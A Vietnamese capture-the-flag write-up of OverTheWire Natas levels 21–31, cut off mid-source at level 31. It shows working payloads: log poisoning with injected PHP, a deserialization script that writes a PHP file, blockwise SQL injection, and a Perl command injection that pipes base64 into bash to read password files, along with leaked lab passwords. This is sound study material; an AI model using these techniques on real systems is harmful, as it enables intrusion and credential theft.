## Natas Level 21 → Level 22

![image](https://hackmd.io/_uploads/Bytah8oT1l.png)

```php
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

Uhm bài này mình dùng burpsuite catch request thì có luôn password ⚆ _ ⚆ . Nhưng mà ý tưởng là khi mình truyền vào query revelio thì web sẽ hiện password và redirect một cách nhanh chóng nhờ vào hàm `header("Location: /");`

![image](https://hackmd.io/_uploads/HklsiClCyg.png)

Và ví mình đã catch được request trước khi chuyển rồi nên vẫn xem được content 

![image](https://hackmd.io/_uploads/SJeM6LjaJg.png)

Ngoài ra ta còn có thể sử dụng curl để xem request trước khi chuyển hướng

![image](https://hackmd.io/_uploads/B1sB3AxCJx.png)

`Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs`

## Natas Level 22 → Level 23

![image](https://hackmd.io/_uploads/HknNaIoTJg.png)

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

Bài này yêu cầu mình nhập vào một chuỗi có chứa chữ `iloveyou` và lớn hơn 10. Khi so sánh chuỗi với số thì mình nghĩ ngay đến `type juggling` hay ép kiểu. Ta có thể đọc doc tại đây https://viblo.asia/p/php-type-juggling-924lJPYWKPM#:~:text=TRUE-,%221abc%22%20%3D%3D%20int(1),-TRUE. Từ đó mình có thể truyền như sau 

![image](https://hackmd.io/_uploads/HkZpzPjpyx.png)

Khi so sánh thì chuỗi trên sẽ ép kiểu số và lấy giá trị 100 nên chắc chắn sẽ lơn hơn 10

![image](https://hackmd.io/_uploads/rJWiGPiaJx.png)

`Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd`

## Natas Level 23 → Level 24

![image](https://hackmd.io/_uploads/rkpDVPjp1e.png)

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

Ok bài này sẽ so sánh passwd mình nhập vào sử dụng hàm strcmp. Nói qua về hàm này thì sẽ trả ra 0 nếu 2 chuỗi giống nhau. Và có một cái khá thú vị là null sẽ bằng 0 trong php và một số ngôn ngữ khác. 

![image](https://hackmd.io/_uploads/ry_RukWAye.png)


Từ đây mình research và thấy nếu so sánh một cái array với một string thì sẽ trả ra null và warning và mình có thể lợi dụng điều này để bypass `https://www.php.net/manual/en/function.strcmp.php#:~:text=strcmp(%22foo%22%2C%20array())%20%3D%3E%20NULL%20%2B%20PHP%20Warning`. Để truyền một array trong query thì ta có thể làm như sau 

![image](https://hackmd.io/_uploads/Hk2xqPjTkx.png)

Nói thêm về hàm strcmp thì ở các version mới của PHP sẽ trigger một cái error đối với so sánh array và string như trên 

![image](https://hackmd.io/_uploads/B1gHqt1ZAyx.png)

`Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`

## Natas Level 24 → Level 25

![image](https://hackmd.io/_uploads/Bkl-6bnpJe.png)


```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
```

Ok bài này là một dạng của path traversal và ta có thể truyền vào query lang như sau để đọc /etc/passwd `....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2fetc/passwd`

![image](https://hackmd.io/_uploads/r1g5pW3T1g.png)

Ở đây web cấm chữ natas_webpass rùi nên không thể truy cập vào lấy flag dễ dàng. Nhưng mình lại để ý hàm này.

```php
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
```

Hàm này sẽ lấy message lưu vào một file log. Và điều đặc biệt là ghi vào cả header User-Agent ? Ok thì mình thử ghi vào một đoạn script php thử xem sao. Có thể thấy nó sẽ được include và thực thi luôn

![image](https://hackmd.io/_uploads/rk080-n6yg.png)

Bây giờ chỉ cần đưa payload đọc password là xong

`<?php echo file_get_contents('/etc/natas_webpass/natas26');?>
`

![image](https://hackmd.io/_uploads/HkR50-hpke.png)

`Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`

## Natas Level 25 → Level 26

![image](https://hackmd.io/_uploads/S1FA0ZnpJl.png)

```php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```

Ok thì web này sẽ cho ta vẽ các line 2D

![image](https://hackmd.io/_uploads/r1jGQ42TJl.png)

Mở cookie lên và mình thấy một dòng base64 và khi decode thì đó chính là phần serialize của bản vẽ có chứa các line 

![image](https://hackmd.io/_uploads/S1SE6yZRyg.png)

![image](https://hackmd.io/_uploads/HyeL6kbCJx.png)

Ok đến đây thì mình đã biết web dĩnh lỗi insecure deserialization khi cho ta thêm cả một class Logger để ta khai thác. 

Ta đã biết khi deserialize thì giá trị sẽ được ghi đè trong class và trong Logger cũng có các hàm magic methods tự động chạy.

```php
<?php 

class Logger{
    public $logFile;
    public $initMsg;
    public $exitMsg;

    function __construct($file){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";

        // write initial message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->initMsg);
        fclose($fd);
    }

    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }

    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }
}

$hehe = new Logger("a");
$hehe->logFile = "/var/www/natas/natas26/img/a.php";
$hehe->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27');?>";

$arr = [array(
    'x1' => "1",
    'y1' => "1",
    'x2' => "200",
    'y2' => "200"
), 
array(
    'x1' => "1",
    'y1' => "200",
    'x2' => "200",
    'y2' => "1",
    "inject" => $hehe
)];
echo base64_encode(serialize($arr));
?>
```

Từ đây mình có thể inject một cái Logger vào và thay đổi phần logFile trỏ về thư mục img vì ta có thể xem được các file trong đây và exitImg chính là đoạn script mà ta cần thực thi 

![image](https://hackmd.io/_uploads/B1iq01b0kx.png)

Khi gắn cookie trên vào và file a.php sẽ được tạo ra và mình có thể vào để xem password

![image](https://hackmd.io/_uploads/SkvQyxbCJg.png)

`Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne`

## Natas Level 26 → Level 27

![image](https://hackmd.io/_uploads/HyvsJeWA1e.png)

```php
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<?php } ?>
```

Sau khi đọc source thì web filter hết các input mình truyền vào rồi nên không thể thực hiện sql injection được. Nhưng có một lỗi khá nhỏ mà tác giả đã cố tình đưa ra nằm ở đây 

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

Có thể thấy username chỉ nhận length <= 64 mà không có hàm nào check length của các input mình truyền vào cả. Mình có research một xí thì thấy sql có một cái gọi là strict mode https://dev.mysql.com/doc/refman/8.4/en/sql-mode.html#:~:text=Strict%20mode%20produces%20an%20error%20for%20attempts%20to%20create%20a%20key%20that%20exceeds%20the%20maximum%20key%20length.%20When%20strict%20mode%20is%20not%20enabled%2C%20this%20results%20in%20a%20warning%20and%20truncation%20of%20the%20key%20to%20the%20maximum%20key%20length. Ok thì cơ bản là khi mode này được bật thì sẽ gây ra lỗi nếu ta truyền vào quá length của trường trong database, ngược lại sẽ cắt sao cho fit với độ dài đó. Từ đó mình có ý tưởng sẽ tạo ra một string như thế này 

`natas28 [100 null characters] a`

sở dĩ thêm chữ a để bypass khúc trim không bị các ký tự null. 

![image](https://hackmd.io/_uploads/rk590x-0Jl.png)

Ok vậy là một user natas28 đã được tạo ra với password hehe từ đây mình đăng nhập lại và có password

![image](https://hackmd.io/_uploads/H1pjCgbRke.png)

`Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj`

## Natas Level 27 → Level 28

Cảm ơn challenge đã khai sáng cho mình thêm về crypto \ (•◡•) /

![image](https://hackmd.io/_uploads/SJwgkZbR1l.png)

![image](https://hackmd.io/_uploads/rk0FPlNAkg.png)

Challenge cho mình một trang web để search từ và sau khi search một từ thì nó sẽ redirect mình đến một trang có query như sau 

![image](https://hackmd.io/_uploads/B12JBlM0Jg.png)

Sau khi khảo sát các query thì mình nhận thấy chiều dài sẽ tăng dựa vào input và được thêm vào như các block có dạng như sau G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP

![image](https://hackmd.io/_uploads/rJ_8rlfCJx.png)

Điều này được xác nhận khi mình query thử một cái gì đó và nhận được lỗi sau 

![image](https://hackmd.io/_uploads/HyPzdezAJx.png)

Ok thì web sử dụng một loại thuật toán mã hóa tên là PKCS#7 dùng để mã hóa cái input của mình và gửi đến server. Đến đây thì mình research và nhận được kết quả sau 

https://medium.com/asecuritysite-when-bob-met-alice/so-what-is-pkcs-7-daf8f4423fd1#:~:text=These%20blocks%20are%20typically%20either%2064%2Dbits%20(8%20bytes)%20or%20128%20bits%20(16%20bytes).%20As%20we%20cannot%20fill%20all%20of%20the%20blocks%2C%20we%20must%20pad%20the%20last%20block.%20PKCS%20%237

Okay để biết nó sử dụng 8 bytes hay 16 bytes mình có thể query đơn giản như sau 

```python
import requests
import re
import urllib.parse

headers = {
    'Authorization': 'Basic bmF0YXMyODoxSk53UU0xT2k2SjZqMWs0OVh5dzdaTjZwWE1RSW5Wag==',
    'Content-Type': 'application/x-www-form-urlencoded',
}

for i in range(1,30):
    data = {
        'query': 'a'*i,
    }
    url = requests.post('http://natas28.natas.labs.overthewire.org/index.php', headers=headers, data=data, verify=False)
    url = re.sub(r'http://natas28.natas.labs.overthewire.org/search.php/\?query=', '', url.url)
    url = urllib.parse.unquote(url)
    print(i, url)
```

![image](https://hackmd.io/_uploads/HySK2gz0Jl.png)

có thể thấy từ length 13 đến 28 có chung một độ dài và sau đó thfi tằng thêm 1 block nên mình có 1 block sẽ có 28 - 13 + 1 = 16 bytes


Có nghĩa là mình có thể tách cái query G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA= như này thành 5 block như sau 



| G+glEae6W/1XjA7vRm21n | NyEco/c+J2TdR0Qp8dcjP | KriAqPE2++uYlniRMkobB1 | vfoQVOxoUVz5bypVRFkZR5 | BPSyq/LC12hqpypTFRyXA= |
|---|---|---|---|---|

Sau khi thử thì mình cũng nhận ra ở độ dài 10 đến 12 có chung block 3 => mỗi block chứa 10 ký tự 

```
10 G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP LAhy3ui8kLEVaROwiiI6Oe c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
11 G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP LAhy3ui8kLEVaROwiiI6Oe tO2gh9PAvqK+3BthQLni68qM9OYQkTq645oGdhkgSlo=
12 G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP LAhy3ui8kLEVaROwiiI6Oe zoKpVTtluBKA+2078pAPR3X9UET9Bj0m9rt/c0tByJk=
```

Thêm nữa nếu ta query đơn giản có 12 bytes và thêm vào dấu ' thì ta sẽ nhận được string 14 bytes? wait what ở đây sẽ có thực hiện escape character ư? Có nghĩa aaaaaaaaaaaa' sẽ thành aaaaaaaaaaaa\\' và đây là cơ chế chống SQL injection 

![image](https://hackmd.io/_uploads/r1cIAgM01l.png)

```
aaaaaaaaaaaa G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP LAhy3ui8kLEVaROwiiI6Oe zoKpVTtluBKA+2078pAPR3X9UET9Bj0m9rt/c0tByJk=
aaaaaaaaaaa' G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP LAhy3ui8kLEVaROwiiI6Oe AoR4lpTRj17RjP+pnk4sd2IjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
aaaaaaaaaaaaa G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP LAhy3ui8kLEVaROwiiI6Oe H3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
```

Đến đây mình có ý tưởng như sau đầu tiên ta nhận ra là 

aaaaaaaaaaa' => aaaaaaaaaaa\\'

Và 

aaaaaaaaa' or 1=1 # => aaaaaaaaa\\' or 1=1 #

Vậy nếu ta đổi thành block 9 bytes và có dấu ' thì sẽ escape thành aaaaaaaaa\\' or 1=1 # và ta đổi block có chứa 10 bytes đầu thành 10 chữ a thì sẽ bypass được dấu escape. 

|aaaaaaaaa\ |' or 1=1 #|
|-|-|
|IR27gK4CQl3Jcmv/0YAxYO|...|

&darr;

|aaaaaaaaaa|' or 1=1 #|
|-|-|
| LAhy3ui8kLEVaROwiiI6Oe | ... |

=> sql injection

Đầu tiên mình query thử `aaaaaaaaa' or 1=1 #` và có một cái query string như sau 

![image](https://hackmd.io/_uploads/rybcebfAyx.png)

G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYOGvcTIly+VB89m++4NjMf0ykofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m


=> Và phần `' or 1=1 #` chính là  GvcTIly+VB89m++4NjMf0ykofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m

Và mình có thể inject vào cái query của aaaaaaaaaa phần SQL injection như sau 

|header|aaaaaaaaaa|SQL injection|trailer|
|-|-|-|-|
|G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP|LAhy3ui8kLEVaROwiiI6Oe|GvcTIly+VB89m++4NjMf0ykofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m|c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=|


=> G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeGvcTIly+VB89m++4NjMf0ykofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5mc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=

Khi query thì ta lấy được data 

![image](https://hackmd.io/_uploads/ByLqWbfAye.png)


Ok ngon vậy là mình đã SQL injection thành công.Bây giờ mình sẽ đọc password bằng payload như sau  `' union select password from users; #` 

G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYO+J3Y2+wVxqbZmTo9x7ejCIaVF1T3rVZFTrXVtnaO5kY1sA1xi1+F7vPb/ZHFEUMHp3PzGFCUqgFAjx+X0DfThWeMV3Pswo+HDk9OvGyAcKQ=

=> +J3Y2+wVxqbZmTo9x7ejCIaVF1T3rVZFTrXVtnaO5kY1sA1xi1+F7vPb/ZHFEUMHp3PzGFCUqgFAjx+X0DfThWeMV3Pswo+HDk9OvGyAcKQ=

Có một vấn đề là phần SQL injection có chứa dấu = ở đằng sau là đuôi của base64 nên mình không thể query nếu chèn thêm đăng sau 

Lúc này mình xài một trick để biến các section thành base64 bằng cách chuyển sang hex và base64 lại 

|header|aaaaaaaaaa|SQL injection|trailer|
|-|-|-|-|
|G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP|LAhy3ui8kLEVaROwiiI6Oe|+J3Y2+wVxqbZmTo9x7ejCIaVF1T3rVZFTrXVtnaO5kY1sA1xi1+F7vPb/ZHFEUMHp3PzGFCUqgFAjx+X0DfThWeMV3Pswo+HDk9OvGyAcKQ=|c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=|


![image](https://hackmd.io/_uploads/r1VSHZfRJx.png)

Query lại và có password

![image](https://hackmd.io/_uploads/r1UVBbM0yg.png)

`Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`

## Natas Level 28 → Level 29

![image](https://hackmd.io/_uploads/B1xD3GzRJe.png)

![image](https://hackmd.io/_uploads/SyCvnfG01x.png)

Bài này sử dụng ngôn ngữ perl để làm server và sử dụng một query file để lấy file nào đó và display ra. Ở đây mình research thì thấy có thể command injection trong hàm open của perl.

https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html#:~:text=The%20open%20command,file%20input%20mechanisms.

Bằng cách thêm | trước lệnh thì ta có thể dễ dàng inject vào như sau mình sử dụng payload `| echo 123` và có được output và .txt 

![image](https://hackmd.io/_uploads/rkLfaffRJl.png)

Mình thử ls nhưng không được 

![image](https://hackmd.io/_uploads/H1mPazfAJl.png)

Thử `echo $(ls)` thì lại được ¯\\_(ツ)_/¯ 

![image](https://hackmd.io/_uploads/ryi_TzzCkg.png)

Ok mình không hiểu cơ chế này lắm nhưng có lẽ chỉ có echo là xài được nên mình thực hiện đọc password bằng payload sau `echo $(cat /etc/natas_webpass/natas30)` 

![image](https://hackmd.io/_uploads/HkujTfz0kx.png)

Whut? mình đã bị trôn ở đây mình thử đọc file index.pl xem có chỗ nào chặn không và quả nhiên nó cấm chữ natas trong payload 

![image](https://hackmd.io/_uploads/r1B1CGGC1e.png)

`if(param('file')){ $f=param('file'); if($f=~/natas/){ print "meeeeeep!
"; } else{ open(FD, "$f.txt");`

Ok thì mình chỉ cần chạy lệnh ở dạng base64 là có thể bypass thui `echo "Y2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczMwCg" | base64 -d | bash`

![image](https://hackmd.io/_uploads/SyIXAMfRJe.png)

`Password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`

## Natas Level 29 → Level 30

![image](https://hackmd.io/_uploads/BJwI0zGRyg.png)

```perl
#!/usr/bin/perl
use CGI qw(:standard);
use DBI;

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "<censored>" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
END

if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}

print <<END;
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
END
```

Lại là một challenge perl, ở đây cho mình nhập vào username và password nhưng lại bị quote để chống SQL injection. Sau khi mình research trong post này thì mình phát hiện như sau. https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection. Ở đây mình có thể bypass bằng cách truyền vào param một array có chứa tham số 2 là một integer và nó sẽ unquote. 

![image](https://hackmd.io/_uploads/SJ3-GXzRke.png)

`Password: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`

## Natas Level 30 → Level 31

![image](https://hackmd.io/_uploads/rJOLfXMC1x.png)

```perl
#!/usr/bin/perl
use CGI;
$ENV{'TMPDIR'}="/var/www/natas/natas31/tmp/";

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">
END

my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
